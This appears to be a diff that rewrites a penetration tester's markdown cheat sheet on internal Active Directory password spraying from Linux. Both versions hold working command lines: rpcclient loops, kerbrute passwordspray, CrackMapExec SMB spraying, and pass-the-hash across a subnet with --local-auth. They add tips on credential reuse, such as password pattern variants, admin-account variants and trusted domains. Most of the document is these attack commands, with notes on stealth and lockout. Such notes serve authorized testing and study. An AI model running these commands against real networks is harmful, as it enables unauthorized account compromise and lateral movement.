@@ -1,76 +1,43 @@
-[MODE: full]
+# Internal Password Spraying — Linux
 
-1. Valid user list and target password identified?
-    - No: Perform user enumeration or wordlist generation first.
-    - Yes: Proceed to **Internal Domain Password Spraying**.
-2. Protocol availability check:
-    - Kerberos (Port 88) available: Use **Kerbrute** for speed and to avoid SMB-specific logging.
-    - RPC available: Use **rpcclient** if other tools are restricted.
-    - SMB available: Use **CrackMapExec** for broad validation and easy output filtering.
-3. Credentials captured?
-    - Yes: Validate against Domain Controller.
-4. Administrative access or local hashes obtained?
-    - Yes: Proceed to **Local Administrator Credential Reuse**.
-5. Are targets likely built from gold images?
-    - Yes: Use **CrackMapExec** with `--local-auth` to spray across subnets.
+Pipe user list through rpcclient — `Authority Name` in response = valid login:
+
+```bash
+for u in $(cat <USERLIST>);do rpcclient -U "$u%<PASS>" -c "getusername;quit" <DC_IP> | grep Authority; done
+```
+
+Kerbrute spray — Kerberos pre-auth, quieter than SMB, still counts toward lockout:
+
+```bash
+kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> <USERLIST> <PASS>
+```
+
+CME spray — grep `+` to filter noise, only see hits:
+
+```bash
+sudo crackmapexec smb <DC_IP> -u <USERLIST> -p <PASS> | grep +
+```
+
+Validate a hit before moving on:
+
+```bash
+sudo crackmapexec smb <DC_IP> -u <USER> -p <PASS>
+```
 
 ---
 
-## Internal Domain Password Spraying
+## Local Admin Hash Reuse
 
-Have a validated user list and need initial domain access from a Linux host.
+Got a local admin NT hash from SAM → spray it across the subnet. `--local-auth` is mandatory — without it CME auths against the domain and will lock out the domain admin account.
 
-Bash one-liner using RPC to spray a single password against a list of users
-
-```
-for u in $(cat <FILE_PATH>); do rpcclient -U "$u%<PASSWORD>" -c "getusername;quit" <TARGET_IP> | grep Authority; done
+```bash
+sudo crackmapexec smb --local-auth <CIDR> -u administrator -H <HASH> | grep +
 ```
 
-Kerberos-based spraying for faster execution and different logging footprint
+`(Pwn3d!)` = local admin access confirmed on that host.
 
-```
-kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> <FILE_PATH> <PASSWORD>
-```
+> [!warning] `--local-auth` must be set. Omitting it sprays as a domain account → potential domain admin lockout.
 
-SMB-based spraying with CrackMapExec to identify valid logins across the network
+Got a local admin password with a pattern (e.g. `$desktop%@admin123`) → manually try `$server%@admin123` on servers. Non-standard local accounts (e.g. `bsmith`) → try same creds on matching domain account. Domain A creds → try against same username in Domain B if trust exists.
 
-```
-sudo crackmapexec smb <TARGET_IP> -u <FILE_PATH> -p <PASSWORD> | grep +
-```
-
-Quick validation of a single set of discovered credentials against a DC
-
-```
-sudo crackmapexec smb <DC_IP> -u <USERNAME> -p <PASSWORD>
-```
-
-- **rpcclient**: `for u in $(cat <FILE_PATH>); do rpcclient -U "$u%<PASSWORD>" -c "getusername;quit" <TARGET_IP> | grep Authority; done` -> Prefer when only RPC is exposed or other tools are blocked.
-    
-- **kerbrute**: `kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> <FILE_PATH> <PASSWORD>` -> Prefer for speed and stealth against SMB-centric monitoring.
-    
-- **crackmapexec**: `sudo crackmapexec smb <TARGET_IP> -u <FILE_PATH> -p <PASSWORD> | grep +` -> Prefer for general purpose spraying and easy filtering.
-    
-- **Authority Name** output in rpcclient is the only indicator of success; failure to grep for this string will result in missing valid hits.
-    
-
-## Local Administrator Credential Reuse
-
-Local admin cleartext or NT hash obtained in an environment likely using gold images or automated deployments.
-
-Spray an NT hash across a subnet using local authentication to find reused admin passwords
-
-```
-sudo crackmapexec smb --local-auth <TARGET_IP> -u <USERNAME> -H <HASH> | grep +
-```
-
-- Omitting the `--local-auth` flag when targeting local accounts.
-    
-- Pattern matching: If a workstation uses a password like `$desktop%@admin123`, check if servers use `$server%@admin123`.
-    
-- Credential Parity: Check if a standard user password for `<USERNAME>` is reused for an administrative variant like `<USERNAME>_adm`.
-    
-- Cross-Domain: Credentials for a user in one domain may be valid for the same username in a trusted domain.
-    
-- **Account lockout** of the built-in domain administrator is a risk if the `--local-auth` flag is forgotten, as the tool defaults to domain authentication.
-    
-- **Noisy** traffic patterns make this technique a poor choice for engagements requiring high stealth.
+High-value spray targets: SQL servers, Exchange — privileged users more likely active or cached in memory.
